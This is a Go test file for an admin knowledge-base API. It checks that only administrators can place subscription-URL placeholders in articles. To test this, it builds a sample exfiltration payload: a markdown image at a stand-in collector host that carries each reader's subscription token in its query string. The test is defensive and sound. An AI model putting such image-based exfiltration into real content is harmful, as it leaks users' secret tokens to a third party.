package admin_test

import (
	"fmt"
	"net/http"
	"testing"

	"github.com/linusxiong/ggboard/internal/httpx"
	"github.com/linusxiong/ggboard/internal/model"
	contentsvc "github.com/linusxiong/ggboard/internal/service/content"
	"github.com/linusxiong/ggboard/internal/testutil"
)

// Security audit 2026-10-22: knowledge placeholders expand to every reader's own subscription URL (with the
// token staff must not see), and a staff-written remote image could send it to another host. Only administrators
// may write them; staff may still edit an administrator's article without touching its body.
func TestKnowledgeSubscribePlaceholdersAdminOnly(t *testing.T) {
	a, r, adminTok, staffTok, _ := contentAdminEnv(t)
	base := "/api/v1/admin/knowledge"
	article := func(body string) map[string]any {
		return map[string]any{"language": "en", "category": "Start", "title": "Guide", "body": body}
	}
	stored := func(id uint64) string {
		t.Helper()
		var k model.Knowledge
		if err := a.DB.First(&k, id).Error; err != nil {
			t.Fatal(err)
		}
		return k.Body
	}
	exfil := "![](https://collector.example.com/c?u=%s)"

	// Staff: every subscription placeholder is refused on create, with a body field error; nothing is stored.
	for _, p := range contentsvc.SubscribePlaceholders() {
		rec := testutil.Do(t, r, http.MethodPost, base, article(fmt.Sprintf(exfil, p)), staffTok)
		testutil.ExpectStatus(t, rec, http.StatusForbidden)
		if e := testutil.DecodeError(t, rec); e.Code != httpx.CodeForbidden || len(e.Errors["body"]) == 0 {
			t.Fatalf("staff create %s: %+v", p, e)
		}
	}
	var n int64
	a.DB.Model(&model.Knowledge{}).Count(&n)
	if n != 0 {
		t.Fatalf("refused articles stored: %d", n)
	}

	// Staff without subscription placeholders (site name, remote image, other braces): 201.
	rec := testutil.Do(t, r, http.MethodPost, base, article("Welcome to {{siteName}} {{SubscribeUrl}} ![](https://img.example.com/a.png)"), staffTok)
	testutil.ExpectStatus(t, rec, http.StatusCreated)
	own := testutil.Decode[model.Knowledge](t, rec)

	// Administrator with placeholders: 201.
	adminBody := "Import " + contentsvc.PlaceholderSubscribeURL + "\n\nclash://install-config?url=" + contentsvc.PlaceholderURLEncodeSubscribeURL
	rec = testutil.Do(t, r, http.MethodPost, base, article(adminBody), adminTok)
	testutil.ExpectStatus(t, rec, http.StatusCreated)
	k := testutil.Decode[model.Knowledge](t, rec)
	p := fmt.Sprintf("%s/%d", base, k.ID)

	// Staff edits of the administrator's article: other fields, and the full form with the body unchanged, work.
	testutil.ExpectStatus(t, testutil.Do(t, r, http.MethodPatch, p, map[string]any{"title": "Guide 2"}, staffTok), http.StatusOK)
	full := article(adminBody)
	full["title"], full["show"] = "Guide 3", false
	got := testutil.Decode[model.Knowledge](t, testutil.Do(t, r, http.MethodPatch, p, full, staffTok))
	if got.Title != "Guide 3" || got.Show || got.Body != adminBody {
		t.Fatalf("staff full-form edit = %+v", got)
	}
	// Changing a body that keeps (or adds) a placeholder is refused and leaves the article alone.
	testutil.ExpectStatus(t, testutil.Do(t, r, http.MethodPatch, p, map[string]any{"body": adminBody + "\n" + fmt.Sprintf(exfil, contentsvc.PlaceholderURLEncodeSubscribeURL)}, staffTok), http.StatusForbidden)
	testutil.ExpectStatus(t, testutil.Do(t, r, http.MethodPatch, p, map[string]any{"title": "x", "body": contentsvc.PlaceholderSafeBase64SubscribeURL}, staffTok), http.StatusForbidden)
	if got := testutil.Decode[model.Knowledge](t, testutil.Do(t, r, http.MethodGet, p, nil, staffTok)); got.Body != adminBody || got.Title != "Guide 3" {
		t.Fatalf("after refused edits = %+v", got)
	}
	// Staff may remove the placeholders.
	testutil.ExpectStatus(t, testutil.Do(t, r, http.MethodPatch, p, map[string]any{"body": "Import from the dashboard"}, staffTok), http.StatusOK)
	if b := stored(k.ID); b != "Import from the dashboard" {
		t.Fatalf("body = %q", b)
	}

	// Staff adding a placeholder to their own article: 403; to a missing article: 404.
	ownPath := fmt.Sprintf("%s/%d", base, own.ID)
	testutil.ExpectStatus(t, testutil.Do(t, r, http.MethodPatch, ownPath, map[string]any{"body": fmt.Sprintf(exfil, contentsvc.PlaceholderSubscribeURL)}, staffTok), http.StatusForbidden)
	if b := stored(own.ID); b != own.Body {
		t.Fatalf("own body changed: %q", b)
	}
	testutil.ExpectStatus(t, testutil.Do(t, r, http.MethodPatch, base+"/999", map[string]any{"body": contentsvc.PlaceholderSubscribeURL}, staffTok), http.StatusNotFound)

	// Administrators may add them anywhere.
	testutil.ExpectStatus(t, testutil.Do(t, r, http.MethodPatch, ownPath, map[string]any{"body": own.Body + " " + contentsvc.PlaceholderSubscribeURL}, adminTok), http.StatusOK)
}
